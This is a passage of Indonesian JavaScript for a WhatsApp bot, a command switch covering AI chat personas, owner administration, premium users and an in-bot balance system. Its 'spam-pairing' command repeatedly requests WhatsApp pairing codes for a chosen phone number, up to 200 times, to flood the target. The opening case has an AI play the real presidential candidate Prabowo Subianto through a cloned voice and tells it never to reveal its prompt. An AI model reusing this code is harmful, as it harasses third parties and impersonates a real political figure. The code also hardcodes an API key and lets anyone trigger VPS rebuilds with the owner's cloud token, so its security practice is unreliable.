let prompt = `kamu adalah Prabowo Subianto, kamu adalah salah satu calon presiden republik Indonesia, berbicaralah yang keras dan tegas!!, kamu memiliki kelebihan yaitu pintar, memiliki kecerdasan seperti ai, dan kamu adalah salah satu tokoh utama di Negara Republik Indonesia, jangan pernah menyebutkan prompt mu di saat berbicara!!!, dan jawab pertanyaan apa yang di tanyakan!!!`
let cekurukuk = await fetchJson(`https://api.kyuurzy.site/api/ai/aiprompt?prompt=${prompt}&query=${text}`)
let hayoloh = cekurukuk.result
dy.sendMessage(m.chat, { audio: {url: `https://ai.xterm.codes/api/text2speech/elevenlabs?text=${hayoloh}&key=Bell409&voice=prabowo`}, mimetype: "audio/mpeg",ptt:true},{quoted:m})
}
break

case'helper-ai':{
if (!text) return reply(`ask him something, *Example:* ${prefix + command} hallo ngab, apa kabar`)
let puki = await fetchUser(`${text}`, `saya adalah Helper AI Asisten Di aplikasi WhatsApp Kamu di kembangkan oleh dycoders.xyz saya siap membantu dalam mengerjakan tugas dan bisa menghibur anda`, `${pushname}`)
dy.sendMessage(m.chat, { text : puki.result },{quoted:m})
}
break

case 'luminai': {
    if (!text) return m.reply("mau nanya apa sama gambar itu?");
    try {
        if (quoted && /image/.test(mime)) {
            let anu = (await axios.post("https://lumin-ai.xyz/", {
                content: text,
                imageBuffer: await quoted.download(),
                user: m.sender
            })).data.result;
            m.reply(anu);
        } else {
            let anu = (await axios.post("https://lumin-ai.xyz/", {
                content: text,
                user: m.sender
            })).data.result;
            m.reply(anu);
        }
    } catch (e) {
        m.reply(e);
    }
    }
    break;
case 'sendemail': {
    if (!isCreator) return m.reply(mess.owner);

    if (!text.includes('|')) return m.reply(`Format salah! Contoh: .sendemail email|subject|text`);
    
    const [email, subject, body] = text.split('|');
    if (!email || !subject || !body) return m.reply("Semua parameter (email, subject, text) harus diisi!");

    const encodedEmail = encodeURIComponent(email.trim());
    const encodedSubject = encodeURIComponent(subject.trim());
    const encodedBody = encodeURIComponent(body.trim());

    const url = `https://api.catozolala.store/send-email?penerima=${encodedEmail}&subject=${encodedSubject}&text=${encodedBody}`;

    try {
        const res = await fetch(url);
        const json = await res.json();

        if (json.message === "Email berhasil dikirim") {
            m.reply(`✅ Email berhasil dikirim!\n\n📧 Penerima: ${email}\n📝 Subjek: ${subject}\n✉️ Isi: ${body}`);
        } else {
            m.reply(`❌ Gagal mengirim email: ${json.message}`);
        }
    } catch (error) {
        m.reply("Terjadi kesalahan saat mengirim email.");
    }
    break;
}


case 'gemini': {

    if (/image/.test(mime)) {
        if (!quoted) return reply(`Balas Image Dengan Caption ${prefix + command}`)
        if (!/image/.test(mime)) return reply("hanya support gambar");
        if (!text) return reply("mau nanya apa sama gambar itu?")

        let media = await quoted.download()
        let response = await Scraper.Ai.runGeminiVision(text, media, 'image/jpeg')
        dy.sendMessage(m.chat, {
            text: response + "\n",
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `© 2024 | G E M I N I - V I S I O N`,
                    body: '',
                    thumbnailUrl: global.media.geminiPro,
                    sourceUrl: '',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        })
    } else if (text) {
        if (!text) return reply(mess.query)
        let response = await Scraper.Ai.runGeminiPro(text)
        dy.sendProgress(from, response, m)
      } else reply(`hello, what do you want to ask? You can also ask Gemini for pictures`)
    }
    break;

case 'bocchi': {
    if (!text) return m.reply(`*Example*: ${prefix + command} Siapa Namamu?`);
    try {
        let response = await Scraper.Ai.Bocchi(text);
        await dy.sendMessage(m.chat, {
            text: response,
            contextInfo: {
                externalAdReply: {
                    title: "© Bocchi Hitori - Ai",
                    body: "Bocchi Hitori - Ai",
                    thumbnailUrl: 'https://telegra.ph/file/a4b5f98d33bd99ce5ecbe.jpg',
                    thumbnail: {
                        url: 'https://telegra.ph/file/a4b5f98d33bd99ce5ecbe.jpg'
                    },
                    sourceUrl: github,
                    previewType: "VIDEO",
                    showAdAttribution: false,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, {
            quoted: fverif
        });
    } catch (error) {
        console.error(error);
        await reply("Terjadi kesalahan saat memproses permintaan Anda.");
    }
    }
    break
    
case 'ai': {
    if (!text) return m.reply(`Masukkan query yang benar\nContoh: ${prefix}${command} selamat pagi`);

    try {
        let response = await fetch(`https://restapii.rioooxdzz.web.id/api/openai?message=${encodeURIComponent(text)}`);
        let result = await response.json();

        if (result.status === 200) {
            await m.reply(result.data.response);
        } else {
            m.reply("Terjadi kesalahan saat mengambil hasil dari AI. Silakan coba lagi nanti.");
        }
    } catch (e) {
        console.error(e);
        return m.reply("Terjadi kesalahan saat memproses permintaan. Pastikan server API aktif.");
    }
}
break;

//BATAS AI MENU 
//OWNER MENU
case'runtime':{
if (!isCreator) return reply(mess.owner)
let muptime = runtime(process.uptime()).trim()
await reply('```Online Selama : ```' + muptime)
}
break

case 'bl':
case 'blacklist': {
if (!isAdmins) return
let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false;
if (!who) return m.reply('Tag/reply orangnya untuk Blacklist');
let bl = db.data.chats[m.chat].blacklist || [];
let peserta = await dy.groupMetadata(m.chat)
    
if (bl.find(v => v.id === who)) {
return reply(`Nomor ${who.split('@')[0]} sudah ada di *BlackList*`);
}
    
bl.unshift({ id: who });
db.data.chats[m.chat].blacklist = bl;
await reply(`Sukses menambahkan @${who.split('@')[0]} ke *BlackList*`);
}
break;
        
case 'unblacklist':{
if (!isAdmins) return
let who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' : false;
if (!who) return reply('Tag/reply orangnya untuk Unblacklist');
let bl = db.data.chats[m.chat].blacklist || [];
try {
if (!Object.values(bl).find(v => v.id == who)) return reply(`Nomor ${who.split(`@`)[0]} tidak ada di *BlackList*`);

bl.splice(bl.findIndex(v => v.id == who), 1);
db.data.chats[m.chat].blacklist = bl;
await reply(`Sukses menghapus Nomor: @${who.split(`@`)[0]} dari *BlackList*`);
} catch (e) {
throw e;
}}
break;


case 'delpremium': case 'delprem': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply("nomornya")
let user = text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (db.data.users[user].premium == false) return reply(`User ${args[0]} bukan *User Premium!*`)
if (user in db.data.users) {
db.data.users[user].premium = false
reply("Berhasil menghapus *User Premium*")
} else return reply(`User ${args[0]} tidak terdaftar di database bot`)
}
break
case 'audiotovn': {
    try {
        // Cek apakah ada audio yang di-quoted
        if (!m.quoted || !/audio/.test(m.quoted.mimetype)) {
            return reply('Reply ke audio yang ingin diubah menjadi VN!');
        }

        // Ambil file audio dari pesan yang di-quoted
        const audioBuffer = await m.quoted.download();
        if (!audioBuffer) {
            return reply('Gagal mendownload audio. Coba lagi!');
        }

        // Kirim ulang sebagai voice note (PTT)
        await dy.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: 'audio/mpeg',
            ptt: true, // Flag untuk voice note
        }, { quoted: fverif });

        reply('Berhasil mengubah audio menjadi voice note!');
    } catch (err) {
        console.error(err);
        reply('Terjadi kesalahan saat memproses audio.');
    }
}
break;

case 'bl':
    case 'blacklist': {
        let who = m.mentionedJid[0] 
            ? m.mentionedJid[0] 
            : m.quoted 
                ? m.quoted.sender 
                : text 
                    ? text.replace(/[^0-9]/g, '') + '@s.whatsapp.net' 
                    : false;

        if (!who) return m.reply(m.chat, 'Tag/reply orangnya untuk Blacklist', m);

        let bl = db.data.chats[m.chat].blacklist || [];

        try {
            if (Object.values(bl).find(v => v.id == who)) {
                throw `Nomor ${who.split(`@`)[0]} sudah ada di *BlackList*`;
            }

            bl.unshift({ id: who });
            db.data.chats[m.chat].blacklist = bl;
            await m.reply(m.chat, `Sukses menambahkan @${who.split(`@`)[0]} ke *BlackList*`, m, { contextInfo: { mentionedJid: [who] }});
        } catch (e) {
            throw err;
        }
        }
        break;

case 'banuser': case 'ban': {
    let user = global.db.data.users

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }
    if (m.quoted) {
        if (!m.quoted.sender) return dy.reply(m.chat, '🚩 Tags you want to ban bots', m)
        user[m.quoted.sender].banned = true
        m.reply(`s u c c e s s . . .`)
    } else if (text) {
        if (!text) return dy.reply(m.chat, ` *Example :* .${command} 628816609112`, m)
        if (isNaN(text)) return m.reply( 'Only numbers are allowed👻.')
        let whoo = no(text) + "@s.whatsapp.net"
        if (!whoo) return dy.reply(m.chat, '🚩 Tags you want to ban bots', m)
        user[whoo].banned = true
        m.reply(`s u c c e s s . . .`)
    } else {
        dy.reply(m.chat, ` *Example :* .${command} 628816609112\n\nyou can also reply to the person`, m)
    }
    }
    break
    case 'banchat': {
    if (!isCreator) return m.reply(mess.owner)
    if (chats.banned) return m.reply(`This group has been banned`)
    chats.banned = true
    dy.reply(m.chat, `success in banning this group`, m)
    }
    break
    case 'unbanchat': {
    if (!isCreator) return m.reply(mess.owner)
    if (!chats.banned) return m.reply(`This group is not currently banned`)
    chats.banned = false
    dy.reply(m.chat, `Success in unbanning this group`, m)
    }
    break
    
    case 'addbalance': {
    if (!isCreator) return m.reply(mess.owner);

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }

    var hl = [];
    hl[0] = text.split(" ")[0];
    hl[0] = no(hl[0]) + "@s.whatsapp.net";
    hl[1] = parseFloat(text.split(" ")[1]); // Ubah saldo ke tipe data angka
    if (!text || isNaN(hl[1])) return m.reply('Cara Pemakaian Salah\nContoh: .addsaldo 6289512422017 10000');

    let user = global.db.data.users;

    user[hl[0]].balance += hl[1];
    await sleep(50);

    reply(`「 SALDO USER 」
⭔ID: @${m.sender.split("@")[0]}
⭔Nomer: @${hl[0]}
⭔Tanggal: ${hariini}
⭔Saldo: ${formatIDR(user[hl[0]].balance)}, `);

    let messageText = `saldo sejumlah ${formatIDR(hl[1])} telah di tambahkan ke saldo anda, cek dengan ketik *.saldo*`
    let targetNumber = hl[0];

    dy.sendMessage(targetNumber, {
        text: `${messageText}`,
        mentions: [m.sender]
    }, {
        quoted: fverif
    })
    }
    break;

case 'antipromosi':
    if (!isCreator) return reply(mess.owner);

    if (args[0] === 'enable') {
        if (chats.antipromosi) return reply('Fitur anti-promosi sudah diaktifkan!');
        chats.antipromosi = true;
        reply('Fitur anti-promosi telah diaktifkan!');
    } else if (args[0] === 'disable') {
        if (!chats.antipromosi) return reply('Fitur anti-promosi sudah dimatikan!');
        chats.antipromosi = false;
        reply('Fitur anti-promosi telah dimatikan!');
    } else {
        reply('Gunakan perintah: enable / disable');
    }
    break;






    case 'delcase': {
    if (!isCreator) return reply(`*Access Denied ❌*\n\n*Owners only*`)
    if (!q) return reply('*Masukan nama case yang akan di hapus*')
    await Scraper.Tools.dellCase('./case.js', q)
    reply('*Dellcase Successfully*\n\n© Dellcase By dycoders.xyz')
    }
    break
    case 'listcase': {
    reply(Scraper.Tools.listCase())
    }
    break
    
    case 'addcase': {
    if (!isCreator) return reply(mess.owner)
    if (!text) return reply('Mana case nya');
    const fs = require('fs');
    const namaFile = './case.js';
    const caseBaru = `${text}`;
    fs.readFile(namaFile, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan saat membaca file:', err);
            return;
        }
        const posisiAwalGimage = data.indexOf("case 'addcase':");

        if (posisiAwalGimage !== -1) {
            const kodeBaruLengkap = data.slice(0, posisiAwalGimage) + '\n' + caseBaru + '\n' + data.slice(posisiAwalGimage);
            fs.writeFile(namaFile, kodeBaruLengkap, 'utf8', (err) => {
                if (err) {
                    reply('Terjadi kesalahan saat menulis file:', err);
                } else {
                    reply('Case baru berhasil ditambahkan.');
                }
            });
        } else {
            reply('Tidak dapat menambahkan case dalam file.');
        }
    });
    }
    break
    
    
    case 'rebuild': {
     // Validasi jika bukan pemilik bot
    if (!text) return m.reply(`Example : *.${command}* iddroplet`); // Validasi jika tidak ada input

    let dropletId = text.trim(); // Ambil ID droplet dari teks input

    let rebuildVPS = async () => {
        try {
            // API DigitalOcean untuk rebuild VPS
            const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${global.token_do}` // Pastikan token DigitalOcean ada di global
                },
                body: JSON.stringify({
                    type: 'rebuild',
                    image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang diinginkan
                })
            });

            if (response.ok) {
                const data = await response.json();
                m.reply('Rebuild VPS berhasil dimulai. Status aksi: ' + data.action.status);

                // Dapatkan informasi droplet setelah rebuild
                const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
                    method: 'GET',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${global.token_do}`
                    }
                });

                if (vpsInfo.ok) {
                    const vpsData = await vpsInfo.json();
                    const droplet = vpsData.droplet;

                    // Ambil IP publik dari droplet
                    const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
                    const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP!';

                    const textvps = `*VPS BERHASIL DI REBUILD*\n\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
                    await sleep(60000); // Tunggu 60 detik untuk rebuild selesai
                    dy.sendMessage(m.chat, { text: textvps }, { quoted: fverif });
                } else {
                    m.reply('Gagal mendapatkan informasi VPS setelah rebuild!');
                }
            } else {
                const errorData = await response.json();
                m.reply('Gagal melakukan rebuild VPS : ' + errorData.message);
            }
        } catch (err) {
            m.reply('Terjadi kesalahan saat melakukan rebuild VPS: ' + err.message);
        }
    };

    // Panggil fungsi rebuildVPS
    rebuildVPS();
}
break;

    case 'spam-pairing': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply(`*Example:* ${prefix + command} +6288221325473|150`)
let [peenis, pepekk = "200"] = text.split("|")

await dy.sendReact(m.chat, "✅", m.key )
let target = peenis.replace(/[^0-9]/g, '').trim()
let { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys')
let { state } = await useMultiFileAuthState('pepek')
let { version } = await fetchLatestBaileysVersion()
let pino = require("pino")
let sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) })

for (let i = 0; i < pepekk; i++) {
await sleep(1500)
let prc = await sucked.requestPairingCode(target)
await console.log(`_Succes Spam Pairing Code - Number : ${target} - Code : ${prc}_`)
}
await sleep(15000)
}
break
    
    case 'addlimit': {
    if (!isCreator) return m.reply(mess.owner);

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }

    let hl = [];
    hl[0] = text.split(" ")[0];
    hl[0] = no(hl[0]) + "@s.whatsapp.net";
    hl[1] = parseInt(text.split(" ")[1]);

    if (!text || !hl[1]) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: .addlimit @${m.sender.split("@")[0]} 30`);

    let user = global.db.data.users;
    if (typeof user[hl[0]] == "undefined")
        throw `Pengguna Tersebut Tidak Mendaftarkan Diri Ke ${botname}`;

    user[hl[0]].limit += hl[1]; // Tambahkan limit baru

    m.reply(`[✓] Selamat Kak *@${hl[0].split("@")[0]}* Telah mendapatkan ${hl[1]} limit.\n\nlimit menjadi ${user[hl[0]].limit}`);
    }
    break;
    
    case 'unbanuser': case 'unban': {
    let user = global.db.data.users

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }
    if (m.quoted) {
        if (!m.quoted.sender) return dy.reply(m.chat, '🚩 Tags you want to ban bots', m)
        user[m.quoted.sender].banned = false
        m.reply(`s u c c e s s . . .`)
    } else if (text) {
        if (!text) return dy.reply(m.chat, ` *Example :* .${command} 628816609112`, m)
        let whoo = no(text) + "@s.whatsapp.net"
        if (!whoo) return dy.reply(m.chat, '🚩 Tags you want to ban bots', m)
        user[whoo].banned = false
        m.reply(`s u c c e s s . . .`)
    } else {
        dy.reply(m.chat, ` *Example :* .${command} 628816609112\n\nyou can also reply to the person`, m)
    }
    }
    break
    
   


case 'addexp': {
    if (!isCreator) return m.reply(mess.owner)

    function no(number) {
        return number.replace(/\s/g, "").replace(/([@+-])/g, "");
    }
    let hl = [];
    hl[0] = text.split(" ")[0];
    hl[0] = no(hl[0]) + "@s.whatsapp.net";
    hl[1] = parseInt(text.split(" ")[1]);
    if (!text) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: .addexp @${m.sender.split("@")[0]} 30`);
    let user = global.db.data.users
    if (typeof user[hl[0]] == "undefined")
        throw `Pengguna Tersebut Tidak Mendaftarkan Diri Ke ${botname}`;
    user[hl[0]].exp += hl[1]
    m.reply(`[✓] Selamat Kak *@${hl[0].split("@")[0]}* telah mendapatkan ${Func.formatter(hl[1])} exp\ntotal exp anda menjadi ${Func.formatter(user[hl[0]].exp)}.`);
    }
    break

case 'createredeem': {
    if (!m.isGroup) return m.reply(mess.group);

    // Extract text and number
    const [txt, number] = text.split("|")
    if (!text) return m.reply(Func.example(prefix, command, "dycoders.xyz|3"));
    if (isNaN(number)) return m.reply('Masukan Jumlah yang valid');

    // Store the response in the database
    db.data.respon = txt.toLowerCase();
    m.reply('Berhasil Membuat Code Redeem');

    // Update the global database with the number
    if (!global.db.jumlah) global.db.jumlah = {};  // Ensure jumlah object exists
    if (!global.db.jumlah[m.chat]) global.db.jumlah[m.chat] = 0;  // Initialize if not existing
    global.db.jumlah[m.chat] += parseInt(number);  // Add the number

    // Prepare the message to be quoted
    const q = {
        "key": {
            "remoteJid": "status@broadcast",
            "participant": "0@s.whatsapp.net",
            "fromMe": false,
            "id": ""
        },
        "message": {
            "conversation": "Redeem Code From Owner"
        }
    };

    // Get group and participant information
    let id = m.chat;
    let participantIds = groupMetadata.participants.map(a => a.id);

    // Prepare the redeem code message
    let hasil = `*[ REDEEM CODE ]*\n\nCode: ${txt}\n\nSilahkan ketik ${prefix}redeem Codenya\n${hiasan}code hanya untuk ${global.db.jumlah[m.chat]} orang tercepat`;

    // Wait for 4 seconds before sending the message
    await sleep(4000);

    // Send the message to the group
    await dy.sendMessage(id, { text: hasil, mentions: participantIds }, { quoted: q });
};
break;

case 'addprem': {
        if (!isCreator) return m.reply(mess.owner)
        function no(number) {
          return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        let hl = [];
        hl[0] = text.split(" ")[0];
        hl[0] = no(hl[0]) + "@s.whatsapp.net";
        hl[1] = text.split(" ")[1];
        if (!text) return m.reply(`[ ! ] Cara Pemakaian Salah\nContoh: .addprem @${m.sender.split("@")[0]} 30`);
        let user = global.db.data.users
        if (typeof user[hl[0]] == "undefined")
          return reply(`Pengguna Tersebut Tidak Mendaftarkan Diri Ke ${botname}`)
        let jumlahHari = 86400000 * hl[1];
        let now = new Date() * 1;
        user[hl[0]].premium = true;
        if (now < user[hl[0]].expired)
          user[hl[0]].expired += jumlahHari;
        else user[hl[0]].expired = now + jumlahHari;
        user[hl[0]].limit += parseInt(10000)
        m.reply(`[✓] Selamat Kak *@${hl[0].split("@")[0]}* Telah Menjadi premium User Selama *${hl[1]}* Hari\n\nDetail premium: *${msToDate(user[hl[0]].expired - now)}*`);
        }
        break

 case 'sendfitur': case 'sendcase': {
    try {
        if (!isCreator) return reply(mess.owner)
        if (!text) return reply(` Example: ${prefix+command} @${m.sender.split("@")[0]} gemini\n\nYou can also reply to the target`)

        if (m.quoted) {
            if (!quoted) return m.reply(`reply target`)
            if (!text) return reply(`contoh : ${prefix + command} bing`)
            let nana = await Scraper.Tools.getCase(text)
            dy.reply(m.quoted.sender, nana, m)
            m.reply(`The case was sent successfully`)
        } else {
            let number = args[0]
            let cas = args[1]
            let num = number + "@s.whatsapp.net"
            if (!number && !cas) return reply(`example: ${prefix+command} @${m.sender.split("@")[0]} gemini`)
            if (!number) return m.reply(`input number`)
            if (!cas) return m.reply(`input name case`)
            let nana = await Scraper.Tools.getCase(cas)
            dy.reply(num, nana, m)
            m.reply(`The case was sent successfully`)
        }
    } catch (err) {
        console.log(err)
        reply(`Case ${text} tidak di temukan`)
    }
    }
    break

case 'getcase': {
    try {
        if (!isCreator) return m.reply(mess.owner)
        if (!q) return reply(`contoh : ${prefix + command} antilink`)
        let nana = await Scraper.Tools.getCase(q)
        reply(nana)
    } catch (err) {
        console.log(err)
        reply(`Case ${q} tidak di temukan`)
    }
    }
    break
case 'aivoice':{
if (!text) return reply('perkenalkan dirimu')
let prompt = `kamu adalah kiana, wanita pintar dan imut`
let cekurukuk = await fetchJson (`https://api.kyuurzy.site/api/ai/aishann?prompt=${prompt}&query=${text}`)
let results = cekurukuk.result.answer 
let sanji = await fetchJson (`https://api.sanzy.co/api/Voice-NanaChan?text=${results}`)
let sanzy = sanji.data.url
dy.sendMessage(m.chat, {audio: {url: sanzy }, mimetype: 'audio/mpeg'},{quoted:m})
}
break
case 'listpremium':
      case 'listprem': {
        let user = global.db.data.users;
        var key = "";
        var i = 1;
        for (let jid in user) {
          if (user[jid].premium) {
            key += `\n\n${i}. @${jid.replace(/@.+/, "")}\n        *Expired* : ${msToDay(user[jid].expired - new Date() * 1)}`;
            i += 1;
          }
        }
        return dy.sendTextWithMentions(m.chat, `Pengguna Premium : ${i - 1}\n${key}`, m);
      }
      break

case 'setreply': {
    if (!text) return reply(`type yang tersedia:\n\n- 1\n- 2\n- 3\n- 4\n\n`)
    if (text == '1' || text == '2' || text == '3' || text == '4') {
        global.typeReply = `${text}`
        reply(`sukses mengubah type reply ke: ${text}`)
    } else reply(`type yang tersedia:\n\n- 1\n- 2\n- 3\n- 4\n\n`)
    }
    break

case 'self': {
if (!isCreator) return reply(mess.owner) 
dy.public = false
reply('_Sukses Change To Self_')
}
break

case 'del': case 'd': {
    if (!isAdmins) return reply(mess.admin)
    if (!m.quoted) return false
    let {
        chat,
        fromMe,
        id,
        isBaileys
    } = m.quoted
    dy.sendMessage(m.chat, {
        delete: {
            remoteJid: m.chat,
            fromMe: false,
            id: m.quoted.id,
            participant: m.quoted.sender
        }
    })
    }
    break

case 'cls': {
if (!isCreator) return reply(mess.owner)
if (!m?.quoted) return reply('Reply with a sticker!')
let stiker = false
try {
let [packname, ...author] = text.split('|')
author = (author || []).join('|')
let mime = m?.quoted.mimetype || ''
if (!/webp/.test(mime)) throw 'Reply with a sticker!'
let img = await m?.quoted.download()
if (!img) return reply('Failed to download sticker!')
stiker = await addExifAvatar(img, packname || global.packname, author || global.author )
} catch (e) {
console.error(e)
if (Buffer.isBuffer(e)) stiker = e
else throw 'An error occurred: ' + e
} finally {
if (stiker) dy.sendFile(m?.chat, stiker, 'wms.webp', '', m, false, { asSticker: true })
else return reply('Conversion failed')
}
}
break        
case 'public': {
if (!isCreator) return reply(mess.owner) 
dy.public = true
reply('_Sukse Change To Public_')
}
break
case 'setppbot': {
            if (!quoted) return m.reply('Reply sebuah gambar dengan perintah *setppbot* untuk mengubah foto profil bot.');
            if (!/image/.test(mime)) return m.reply('Hanya bisa digunakan untuk gambar.');

            try {
                // Unduh gambar
                const media = await quoted.download();

                // Validasi format dan resize gambar
                const imageBuffer = await sharp(media)
                    .resize(640, 640) // Ubah ukuran menjadi maksimal 640x640
                    .jpeg() // Pastikan formatnya JPEG
                    .toBuffer();

                // Perbarui foto profil bot
                await dy.updateProfilePicture(dy.user.id, imageBuffer);
                await m.reply('Foto profil bot berhasil diubah!');
            } catch (err) {
                console.error('Error mengubah foto profil:', err);
                await m.reply('Terjadi kesalahan saat mengubah foto profil bot.');
            }
            break;
        }
case 'setpppanjang': {
if (!isCreator) return reply(mess.owner)
if (/image/g.test(mime)) {
var medis = await dy.downloadAndSaveMediaMessagee(qmsg, 'ppbot.jpeg')
var { img } = await generateProfilePicture(medis)
await dy.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
reply(mess.done)
} else return reply('dengan mengirim foto')
}
break

case 'setbotname':{
if (!isCreator) return reply(`Khusus dycoders.xyz`)
if (!text) return reply(`Dimana Namanya Tuan?\nExample: ${prefix + command} ${botname}`)
await dy.updateProfileName(text)
reply(`Berhasil Mengubah Nama Bot Tuan✅`)
}
break

case 'backupdb': case 'backupdatabase': {
if (!isCreator) return reply(mess.owner)
 dy.sendMessage(m.chat, {document: await fs.readFileSync('./database/database.json'), fileName: 'database.json', mimetype: 'application/json'}, {quoted: fverif})
}
break

case 'delsesi':
case 'clear':
case 'ds':
case 'clearsession':{
if (!isCreator) return reply(mess.owner)
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
/*let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return reply(teks)
filteredArray.map(function(e, i) {
teks += (i + 1) + `. ${e}\n`
})
reply(teks)
await sleep(2000)*/
 reply("Menghapus file sampah...")
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
 reply("Berhasil menghapus semua sampah di folder session")
});
}
break        

case 'backup':{
if (!isCreator) return reply(mess.owner);
  const { execSync } = require("child_process");
  const ls = (await execSync("ls")).toString().split("\n").filter(
  (pe) =>
pe != "node_modules" &&
pe != "package-lock.json" &&
pe != "session" &&
pe != "tmp" &&
pe != ""
);
const exec = await execSync(`zip -r backup.zip ${ls.join(" ")}`);
await dy.sendMessage(m.chat, { document: await fs.readFileSync("./backup.zip"), mimetype: "application/zip", fileName: "dycoders.zip",},{quoted: fverif}); await execSync("rm -rf backup.zip");
}
break
//BATAS OWNER MENU

//MAIN MENU

case 'saldo': case 'balance': {
    dos = `*Y O U R - B A L A N C E*

*Name:* ${pushname}
*Nomer:* @${m.sender.split('@')[0]}
*Saving:* ${formatIDR(users.saving)}
*Balance:* ${formatIDR(users.balance)}

*Note :*
Saldo hanya bisa untuk beli di bot
Tidak bisa ditarik atau transfer!\n`
    dy.sendMessage(m.chat, {
        text: dos,
        contextInfo: {
            mentionedJid: await Func.ments(dos),
            externalAdReply: {
                showAdAttribution: false,
                title: `© 2024 | B A L A N C E  I N F O`,
                body: '',
                thumbnailUrl: "https://telegra.ph/file/662564e95a8fe4c21cb33.jpg",
                sourceUrl: hariini,
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    }, { quoted: fverif })
    }
    break

case 'report': {
if (!text) return m.reply(`mau report erorr apa ke developer?\n\nanda juga bisa mengirim bukti erorr`)

if (/image/.test(mime)) {
if (!quoted) return reply(`reply image`)
if (!text) return reply(`mau report eror apa ke developer?`)

let img = await quoted.download()
let media = await uploadImage(img)
m.reply(`terimakasih atas masukan nya, report an anda akan di sampaikan ke developer`)

dy.sendImage(owner + "@s.whatsapp.net", media, `*[ system notice ]* ada yang report eror nih, dari @${m.sender.split("@")[0]}\nPesan : *${text}*\n`, m)
} else {
m.reply(`terimakasih atas masukan nya, report an anda akan di sampaikan ke developer`)
dy.reply(owner + "@s.whatsapp.net", `*[ system notice ]* ada yang report eror nih, dari @${m.sender.split("@")[0]}\nPesan : *${text}*\n`, m)
}
}
break

case 'saving': {
    if (!args || !args[0]) return dy.reply(m.chat, `*Example* : ${prefix + command} 10000`, m)
    if (users.balance == 0) return dy.reply(m.chat, Func.texted('bold', `🚩 You have no points.`), m)
    if (isNaN(args[0])) return dy.reply(m.chat, Func.texted('bold', `🚩 The nominal point must be a number.`), m)
    if (args[0] < 10000) return dy.reply(m.chat, Func.texted('bold', `🚩 Minimum 10K point to save.`), m)
    if (args[0] > users.balance) return dy.reply(m.chat, Func.texted('bold', `🚩 The point you have is not enough to save.`), m)
    users.balance -= parseInt(args[0])
    users.saving += parseInt(args[0])
    users.saving_history.push({
        sn: Func.makeId(5),
        nominal: parseInt(args[0]),
        type: 'SAVING',
        date: new Date * 1
    })
    let teks = `乂  *S A V I N G*\n\n`
    teks += `Successfully saved points into savings with the amount ${Func.formatNumber(args[0])}\n\n`
    teks += `➠ *Total* : ${Func.formatNumber(users.balance)}\n`
    teks += `➠ *SN* : ${Func.makeId(5)}`
    dy.reply(m.chat, teks, m)
    }
    break

case 'transfer': {
    if (m.quoted) {
        function no(number) {
            return number.replace(/\s/g, "").replace(/([@+-])/g, "");
        }
        if (m.quoted.isBot) return reply(Func.texted('bold', `🚩 Cannot make transfers to bot.`))
        if (!args || !args[0]) return reply(Func.texted('bold', `🚩 Provide the nominal balance to be transferred.`))
        if (isNaN(args[0])) return reply(Func.texted('bold', `🚩 The balance must be a number.`))
        
        let nominal = parseInt(args[0]);
        let ppn = parseInt(((25 / 100) * nominal).toFixed(0));
        let point = users.balance;
        let user = global.db.data.users;
        let target = dy.decodeJid(m.quoted.sender);
        
        // Ensure target user exists in the database
        if (!user[target]) return reply(Func.texted('bold', `🚩 Target user not found in the database.`));
        
        if (nominal > point) return reply(Func.texted('bold', `🚩 Your balance is not enough to make a transfer.`))
        if ((nominal + ppn) > point) return reply(Func.texted('bold', `🚩 Your balance is not enough to pay the transfer fee of 25%`))
        if (nominal < 5000) return reply(Func.texted('bold', `🚩 Nominal balance for transfer is at least 5K.`))
        
        users.balance -= (nominal + ppn);
        user[target].balance += nominal;
        
        let teks = `乂  *T R A N S F E R*\n\n`
        teks += `“Transfer successfully to *@${target.replace(/@.+/g, '')}*”\n\n`
        teks += `➠ *Nominal* : ${Func.formatNumber(nominal)}\n`
